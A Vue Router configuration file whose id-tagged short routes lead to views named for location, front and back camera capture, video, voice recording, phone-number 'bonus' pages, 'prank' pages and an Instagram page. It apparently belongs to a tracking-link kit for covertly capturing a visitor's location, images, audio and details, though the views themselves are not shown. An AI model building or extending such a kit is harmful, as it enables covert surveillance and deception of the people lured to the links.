import {createRouter, createWebHistory} from 'vue-router'
import Location from "@/views/Location.vue";
import FrontCamera from "@/views/FrontCamera.vue";
import BackCamera from "@/views/BackCamera.vue";
import Instagram from "@/views/instagram.vue";
import Prank from "@/views/Prank.vue";
import BonusForPhoneNumber from "@/views/BonusForPhoneNumber.vue";
import FronCamVideo from "@/views/FronCamVideo.vue";
import BackCamVideo from "@/views/BackCamVideo.vue";
import VoiceRecord from "@/views/VoiceRecord.vue";


const routes = [
    {
        path: '/video-prank/:id',
        name: 'video-prank',
        component: FronCamVideo
    },
    {

        path: '/lk/:id',
        name: 'Location',
        component: Location
    }, {
        path: '/ph/:id',
        name: 'FrontCam',
        component: FrontCamera

    }, {
        path: '/bc/:id',
        name: 'BackCam',
        component: BackCamera
    }, {
        path: '/instagram',
        name: 'Instagram',
        component: Instagram
    }, {
        path: '/prank/:id',
        name: 'Prank',
        component: Prank
    }, {
        path: '/bonus/:id',
        name: 'bonus',
        component: BonusForPhoneNumber
    },

    {
        path: '/video-prank2/:id',
        name: 'video-prank2',
        component: BackCamVideo
    },
    {
        path: '/bonus-voice/:id',
        name: 'voice',
        component: VoiceRecord
    }

]

const router = createRouter({
    history: createWebHistory(),
    routes
})

export default router
